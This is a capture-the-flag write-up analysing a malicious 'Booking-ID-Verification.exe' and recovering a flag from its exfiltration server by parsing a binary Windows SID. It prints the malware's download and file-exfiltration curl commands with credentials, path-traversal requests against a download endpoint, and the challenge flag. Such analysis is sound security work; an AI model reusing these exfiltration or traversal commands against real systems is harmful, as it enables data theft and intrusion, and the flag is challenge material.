# CTF Challenge Writeup: Booking-ID-Verification.exe

## Challenge Overview
Analysis of a malicious executable that leads to discovering exfiltrated data and ultimately recovering a flag through forensic analysis.

**Flag:** `flag{0a741a06d3b8227f75773e3195e1d641}`

---

## Initial Analysis

### File Reconnaissance
```bash
file Booking-ID-Verification.exe
strings Booking-ID-Verification.exe | tee strings.txt
```

### Key Artifacts Found

**Emoji Stream Extraction:**
```bash
strings Booking-ID-Verification.exe | grep -o '[🐡🐳🐠🐬🦈🐢🌺🌈🌊🦀🥥🌴🐚🌋🐙🐋]' > emoji_stream.txt
```

**User SIDs Discovered:**
- `S-1-5-21-1693682860-607145093-2874071422-1001` (user: admin)
- `S-1-5-21-1693682860-607145093-2874071422-500` (Administrator)

**Malware Download Command:**
```bash
C:\WINDOWS\system32\cmd.exe /c curl -fL -sS --connect-timeout 30 \
  -o "C:\Users\admin\AppData\Local\Temp\56051e1c921f6524\c4328f32c30a1ede.exe" \
  "https://7-zip.org/a/7zr.exe"
```

---

## The Rabbit Hole

Initially attempted to reverse engineer embedded Lua bytecode:
```bash
# These commands led nowhere:
strings booking.exe | grep -E "Lua|luac"
binwalk booking.exe
foremost booking.exe
binwalk -e booking.exe
```

**Lesson Learned:** While interesting, the Lua analysis was not the key to solving this challenge.

---

## The Breakthrough: Dynamic Analysis

### Using ANY.RUN
**Key Tool:** [any.run](https://any.run/) - Online malware sandbox

Running the executable in the ANY.RUN sandbox revealed the actual malware behavior and exfiltration endpoints.

---

## Data Exfiltration Discovery

### Exfiltration Endpoint Found
```bash
curl -sS --connect-timeout 30 -m 30 -o - -w HTTPSTATUS:%{http_code} \
  -u "prometheus:PA4tqS5NHFpkQwumsd3D92cb" \
  -F "file=@C:\Users\admin\AppData\Local\Temp\42251403fca54ea4\DESKTOP-JGLLJLD_admin.log" \
  "https://3b89a8dc.proxy.coursestack.com/a9GeV5t1FFrTqNXUN2vaq93mNKfSDqESBn2IlNiGRvh6xYUsQFEk4rRo8ajGA7fiEDe1ugdmAbCeqXw6y0870YkBqU1hrVTzgDIHZplop8WAWTiS3vQPOdNP"
```

**Credentials Found:**
- Username: `prometheus`
- Password: `PA4tqS5NHFpkQwumsd3D92cb`

---

## Accessing the Exfiltration Server

### Network Configuration
**Important:** Had to connect via OpenVPN and use **IP address** instead of the provided URL.

**Working Access Method:**
```
IP Address: 10.1.112.199
Path: /a9GeV5t1FFrTqNXUN2vaq93mNKfSDqESBn2IlNiGRvh6xYUsQFEk4rRo8ajGA7fiEDe1ugdmAbCeqXw6y0870YkBqU1hrVTzgDIHZplop8WAWTiS3vQPOdNP
```

**Access URL:**
```
http://10.1.112.199/a9GeV5t1FFrTqNXUN2vaq93mNKfSDqESBn2IlNiGRvh6xYUsQFEk4rRo8ajGA7fiEDe1ugdmAbCeqXw6y0870YkBqU1hrVTzgDIHZplop8WAWTiS3vQPOdNP
```

### Downloaded Files
- `DESKTOP-JGLLJLD_admin.log`
- `c4328f32c30a1ede.zip` (password protected)

---

## The Password Hunt

### Analyzing the Exfiltrated Log File

The `DESKTOP-JGLLJLD_admin.log` file contained raw binary data representing a Windows SID in byte format:
```
1
5
0
0
0
0
0
5
21
0
0
0
18
239
154
226
242
155
126
245
147
116
180
120
244
1
0
0
```

### Parsing the SID from Binary Data

Windows SIDs are stored in binary format with this structure:
- Revision (1 byte)
- Authority (6 bytes)
- Sub-authorities (4 bytes each, little-endian)
- RID (4 bytes, little-endian)

**Python script to parse the SID:**
```python
# Read the log file bytes
data = [1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 18, 239, 154, 226, 
        242, 155, 126, 245, 147, 116, 180, 120, 244, 1, 0, 0]

# Parse SID components
revision = data[0]  # 1
authority = data[7]  # 5 (NT Authority)

# Convert little-endian bytes to integers
def bytes_to_int(bytes_list):
    return int.from_bytes(bytes_list, byteorder='little')

# Extract sub-authorities (starting at index 12)
sub_auth1 = bytes_to_int(data[12:16])   # 3801804562
sub_auth2 = bytes_to_int(data[16:20])   # 4118715378
sub_auth3 = bytes_to_int(data[20:24])   # 2025092243
rid = bytes_to_int(data[24:28])         # 500

# Construct SID
sid = f"S-{revision}-{authority}-21-{sub_auth1}-{sub_auth2}-{sub_auth3}-{rid}"
print(sid)
# Output: S-1-5-21-3801804562-4118715378-2025092243-500
```

**Key Discovery:** RID 500 = Administrator account (well-known Windows RID)

### Cracking the ZIP Password

With only one significant artifact extracted from the exfiltrated data (the Administrator SID), and no explicit password hints in the logs, I tried using the SID as the password:
```
Password: S-1-5-21-3801804562-4118715378-2025092243-500
```

**Reasoning:**
- The SID was the only unique identifier in the exfiltrated data
- CTF challenges commonly use discovered artifacts as keys/passwords
- The specific RID 500 indicated this was the Administrator account

**Success!** The SID was indeed the password. Retrieved the flag from the decrypted archive.

### Critical Discovery in Log File
Found a **different SID** for the Administrator account in the log:
```
S-1-5-21-3801804562-4118715378-2025092243-500
```

**Note:** This was NOT the original SID found in the initial strings analysis. Had to extract it from the RID data in the log file.

### Cracking the ZIP
Used the discovered SID as the password:
```
Password: S-1-5-21-3801804562-4118715378-2025092243-500
```

**Success!** Retrieved the flag from the decrypted archive.

---

## Solution Summary

1. **Reconnaissance:** Extract strings and artifacts from the executable
2. **Dynamic Analysis:** Use ANY.RUN to observe actual malware behavior
3. **Credential Discovery:** Find exfiltration credentials in network traffic
4. **Network Access:** Connect via OpenVPN using IP address instead of hostname
5. **Forensic Analysis:** Examine log files for additional SID information
6. **Decryption:** Use the log-derived SID as the archive password
7. **Victory:** Extract the flag

---

## Key Takeaways

1. **Don't Get Stuck:** Initial Lua reverse engineering was a dead end - pivot quickly
2. **Dynamic Analysis Wins:** Sandbox analysis (ANY.RUN) was critical for understanding actual behavior
3. **Network Quirks:** Sometimes you need to use IP addresses instead of hostnames
4. **Read the Logs:** The password wasn't in the strings output - it was in the exfiltrated log file
5. **SIDs as Passwords:** Creative password use - check for unique identifiers in forensic artifacts

---

## Tools Used

- `strings` - Extract readable text from binary
- `grep` - Pattern matching
- `curl` - HTTP requests and file downloads
- **ANY.RUN** - Online malware sandbox (🔑 Key Tool)
- OpenVPN - Network access to challenge infrastructure

---

## Commands Reference

### Initial Analysis
```bash
file Booking-ID-Verification.exe
strings Booking-ID-Verification.exe | tee strings.txt
strings Booking-ID-Verification.exe | grep -o '[🐡🐳🐠🐬🦈🐢🌺🌈🌊🦀🥥🌴🐚🌋🐙🐋]' > emoji_stream.txt
```

### Attempted File Extraction (Dead End)
```bash
strings booking.exe | grep -i "http\|curl\|download\|7zip"
strings booking.exe | grep -E "Lua|luac"
binwalk booking.exe
foremost booking.exe
binwalk -e booking.exe
```

### Data Retrieval Attempts
```bash
# Original attempt with path traversal
curl -G "https://f0038682.proxy.coursestack.com/download" \
  -H "Cookie: token=f0038682-f979-4e37-aab7-9ec40d83b024_1_ab584dfaffa57fedb2d865733aacdbe727552f1cc520e12c7a8a9cfde640ff6c" \
  --data-urlencode 'file=../../../../../../../../Users/admin/AppData\Local\Temp\56051e1c921f6524\c4328f32c30a1ede.exe' \
  --output found.zip

# URL encoding approach
TRAV="../Users/admin/AppData/Local/Temp/c4328f32c30a1ede.exe"
ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$TRAV")
curl -k -fL --connect-timeout 30 \
  -H "Cookie: token=f0038682-f979-4e37-aab7-9ec40d83b024_1_ab584dfaffa57fedb2d865733aacdbe727552f1cc520e12c7a8a9cfde640ff6c" \
  -o "c4328f32c30a1ede.zip" \
  "https://f0038682.proxy.coursestack.com/file=${ENC}"
```

---

## Flag
```
flag{0a741a06d3b8227f75773e3195e1d641}
```

---

## Notes for Future Challenges

- **c4328f32c30a1ede.exe** was actually **c4328f32c30a1ede.zip** (needed to rename)
- When dealing with challenge infrastructure, try both hostname and IP address
- Always check exfiltrated logs for additional credentials/keys
- Dynamic analysis often reveals what static analysis misses
- SIDs and other system identifiers can be used as passwords/keys

